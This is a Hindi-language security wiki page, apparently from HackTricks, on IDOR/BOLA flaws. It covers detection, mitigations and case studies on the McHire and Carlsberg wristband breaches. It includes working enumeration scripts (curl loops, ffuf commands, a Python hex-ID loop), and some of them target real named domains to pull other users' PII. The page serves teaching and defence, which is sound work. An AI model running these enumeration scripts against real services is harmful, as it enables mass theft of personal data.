# IDOR (Insecure Direct Object Reference)

{{#include ../banners/hacktricks-training.md}}

IDOR (Insecure Direct Object Reference) / Broken Object Level Authorization (BOLA) तब होता है जब कोई वेब या API endpoint एक user–controllable identifier प्रकाशित या स्वीकार करता है जिसे आंतरिक ऑब्जेक्ट तक पहुंचने के लिए **सीधे** इस्तेमाल किया जाता है **बिना यह सत्यापित किए कि कॉलर उस ऑब्जेक्ट को एक्सेस/संशोधित करने के लिए अधिकृत है**।
सफल शोषण आम तौर पर horizontal या vertical privilege-escalation की अनुमति देता है, जैसे अन्य उपयोगकर्ताओं के डेटा को पढ़ना या संशोधित करना और, सबसे खराब स्थिति में, full account takeover या mass-data exfiltration।

---
## 1. Identifying Potential IDORs

1. Look for **parameters that reference an object**:
* Path: `/api/user/1234`, `/files/550e8400-e29b-41d4-a716-446655440000`
* Query: `?id=42`, `?invoice=2024-00001`
* Body / JSON: `{"user_id": 321, "order_id": 987}`
* Headers / Cookies: `X-Client-ID: 4711`
2. Prefer endpoints that **read or update** data (`GET`, `PUT`, `PATCH`, `DELETE`).
3. Note when identifiers are **sequential or predictable** – if your ID is `64185742`, then `64185741` probably exists.
4. Explore hidden or alternate flows (e.g. *"Paradox team members"* link in login pages) that might expose extra APIs.
5. Use an **authenticated low-privilege session** and change only the ID **keeping the same token/cookie**. The absence of an authorization error is usually a sign of IDOR.

### त्वरित मैन्युअल टैंपरिंग (Burp Repeater)
```
PUT /api/lead/cem-xhr HTTP/1.1
Host: www.example.com
Cookie: auth=eyJhbGciOiJIUzI1NiJ9...
Content-Type: application/json

{"lead_id":64185741}
```
### स्वचालित enumeration (Burp Intruder / curl loop)
```bash
for id in $(seq 64185742 64185700); do
curl -s -X PUT 'https://www.example.com/api/lead/cem-xhr' \
-H 'Content-Type: application/json' \
-H "Cookie: auth=$TOKEN" \
-d '{"lead_id":'"$id"'}' | jq -e '.email' && echo "Hit $id";
done
```
### अनुमानित डाउनलोड ID की सूची बनाना (ffuf)
Authenticated file-hosting panels अक्सर per-user metadata को एक ही `files` table में स्टोर करते हैं और एक download endpoint जैसे `/download.php?id=<int>` को एक्सपोज़ करते हैं। अगर handler केवल यह चेक करता है कि ID मौजूद है (और यह नहीं कि वह authenticated user का है), तो आप अपनी valid session cookie के साथ integer स्पेस को sweep करके अन्य tenants के backups/configs चुरा सकते हैं:
```bash
ffuf -u http://file.era.htb/download.php?id=FUZZ \
-H "Cookie: PHPSESSID=<session>" \
-w <(seq 0 6000) \
-fr 'File Not Found' \
-o hits.json
jq -r '.results[].url' hits.json    # fetch surviving IDs such as company backups or signing keys
```
* `-fr` 404-style templates हटाता है ताकि केवल असली hits बचें (e.g., IDs 54/150 leaking full site backups and signing material).
* The same FFUF workflow works with Burp Intruder or a curl loop—just ensure you stay authenticated while incrementing IDs.

---

### Error-response oracle for user/file enumeration

When a download endpoint accepts both a username and a filename (e.g. `/view.php?username=<u>&file=<f>`), subtle differences in error messages often create an oracle:

- username मौजूद नहीं है → "User not found"
- गलत filename लेकिन valid extension → "File does not exist" (कभी-कभी उपलब्ध files की सूची भी दिखाता है)
- गलत extension → validation error

With any authenticated session, you can fuzz the username parameter while holding a benign filename and filter on the "user not found" string to discover valid users:
```bash
ffuf -u 'http://target/view.php?username=FUZZ&file=test.doc' \
-b 'PHPSESSID=<session-cookie>' \
-w /opt/SecLists/Usernames/Names/names.txt \
-fr 'User not found'
```
एक बार मान्य उपयोगकर्ता नाम पहचाने जाने के बाद, विशिष्ट फ़ाइलों को सीधे अनुरोध करें (उदा., `/view.php?username=amanda&file=privacy.odt`). यह पैटर्न अक्सर अन्य उपयोगकर्ताओं के दस्तावेज़ों के अनधिकृत प्रकटीकरण और credential leakage का कारण बनता है।

---
## 2. वास्तविक केस स्टडी – McHire Chatbot Platform (2025)

Paradox.ai-समर्थित **McHire** भर्ती पोर्टल के आकलन के दौरान निम्नलिखित IDOR पाया गया:

* Endpoint: `PUT /api/lead/cem-xhr`
* Authorization: user session cookie for **any** restaurant test account
* Body parameter: `{"lead_id": N}` – 8-अंकों का, **क्रमिक** संख्यात्मक पहचानकर्ता

lead_id घटाकर परीक्षणकर्ता ने मनमाने आवेदकों का **full PII** (name, e-mail, phone, address, shift preferences) तथा एक consumer **JWT** प्राप्त किया, जिससे session hijacking संभव हुआ। रेंज `1 – 64,185,742` का अनुक्रमण लगभग **64 million** रिकॉर्ड उजागर कर गया।

Proof-of-Concept request:
```bash
curl -X PUT 'https://www.mchire.com/api/lead/cem-xhr' \
-H 'Content-Type: application/json' \
-d '{"lead_id":64185741}'
```
Combined with **default admin credentials** (`123456:123456`) that granted access to the test account, the vulnerability resulted in a critical, company-wide data breach.

### केस स्टडी – रिस्टबैंड QR codes को कमज़ोर bearer tokens के रूप में (2025–2026)

*Flow:* प्रदर्शनी के विज़िटर्स को QR-coded रिस्टबैंड दिए गए; स्कैन करने पर `https://homeofcarlsberg.com/memories/` ब्राउज़र **printed wristband ID** लेता था, इसे hex-encode करता था, और stored media (photos/videos + names) को fetch करने के लिए `cloudfunctions.net` बैकएंड को कॉल करता था। कोई **session binding** या user authentication मौजूद नहीं था — **knowledge of the ID = authorization**।

*Predictability:* रिस्टबैंड IDs छोटे पैटर्न का पालन करते थे, जैसे `C-285-100` → ASCII hex `432d3238352d313030` (`43 2d 32 38 35 2d 31 30 30`)। की स्पेस का अनुमान लगभग ~26M combinations था, जिसे ऑनलाइन आसानी से exhaust किया जा सकता था।

*Exploitation workflow with Burp Intruder:*
1. **Payload generation:** candidate IDs बनाएँ (उदा., `[A-Z]-###-###`)। Burp Intruder के **Pitchfork** या **Cluster Bomb** attack का उपयोग करें, letter और digits के लिए positions सेट करें। एक **payload processing rule → Add prefix/suffix → payload encoding: ASCII hex** जोड़ें ताकि प्रत्येक request backend द्वारा अपेक्षित hex string भेजे।
2. **Response grep:** Intruder में केवल valid responses में मौजूद markers के लिए **grep-match** मार्क करें (उदा., media URLs/JSON fields)। Invalid IDs आमतौर पर एक empty array/404 लौटाते थे।
3. **Throughput measurement:** लगभग 1,000,000 IDs ~2 घंटे में एक लैपटॉप से टेस्ट किए गए (~139 req/s)। उस रेट पर पूरा keyspace (~26M) ~52 घंटे में गिर जाएगा। इस sample run ने पहले ही ~500 valid wristbands (videos + full names) उजागर कर दिए थे।
4. **Rate-limiting verification:** vendor ने throttling का दावा करने के बाद उसी Intruder config को फिर चलाया गया। समान throughput/hit-rate ने साबित किया कि नियंत्रण मौजूद नहीं/अप्रभावी था; enumeration बिना रोके जारी रही।

Quick scriptable variant (client-side hex encoding):
```python
import requests

def to_hex(s):
return ''.join(f"{ord(c):02x}" for c in s)

for band_id in ["C-285-100", "T-544-492"]:
hex_id = to_hex(band_id)
r = requests.get("https://homeofcarlsberg.com/memories/api", params={"id": hex_id})
if r.ok and "media" in r.text:
print(band_id, "->", r.json())
```
> **Lesson:** Encoding (ASCII→hex/Base64) does **not** add entropy; short IDs become **bearer tokens** that are enumerable despite cosmetic encoding. Without per-user authorization + high-entropy secrets, media/PII can be bulk-harvested even if “rate limiting” is claimed.

---
## 3. IDOR / BOLA का प्रभाव
* Horizontal escalation – पढ़ना/अपडेट/डिलीट **अन्य उपयोगकर्ताओं** का डेटा।
* Vertical escalation – कम-privileged उपयोगकर्ता को admin-केवल कार्यक्षमता मिल जाना।
* Mass-data breach — यदि identifiers क्रमिक हों (उदा., applicant IDs, invoices)।
* Account takeover — अन्य उपयोगकर्ताओं के tokens चुराकर या उनके पासवर्ड रीसेट करके अकाउंट पर कब्जा।

---
## 4. निवारक उपाय और सर्वोत्तम प्रथाएँ
1. **Enforce object-level authorization** को प्रत्येक अनुरोध पर लागू करें (`user_id == session.user`)।
2. auto-increment IDs के बजाय **indirect, unguessable identifiers** (UUIDv4, ULID) को प्राथमिकता दें।
3. authorization **server-side** में करें, hidden form fields या UI controls पर कभी भरोसा न करें।
4. एक केंद्रीय middleware में **RBAC / ABAC** checks लागू करें।
5. IDs के enumeration का पता लगाने के लिए **rate-limiting & logging** जोड़ें।
6. हर नए endpoint का security test करें (unit, integration, and DAST)।

---
## 5. उपकरण
* **BurpSuite extensions**: Authorize, Auto Repeater, Turbo Intruder.
* **OWASP ZAP**: Auth Matrix, Forced Browse.
* **Github projects**: `bwapp-idor-scanner`, `Blindy` (bulk IDOR hunting).



## संदर्भ
* [McHire Chatbot Platform: Default Credentials and IDOR Expose 64M Applicants’ PII](https://ian.sh/mcdonalds)
* [OWASP Top 10 – Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
* [How to Find More IDORs – Vickie Li](https://medium.com/@vickieli/how-to-find-more-idors-ae2db67c9489)
* [HTB Nocturnal: IDOR oracle → file theft](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
* [0xdf – HTB Era: predictable download IDs → backups and signing keys](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
* [Carlsberg memories wristband IDOR – predictable QR IDs + Intruder brute force (2026)](https://www.pentestpartners.com/security-blog/carlsberg-probably-not-the-best-cybersecurity-in-the-world/)
{{#include ../banners/hacktricks-training.md}}
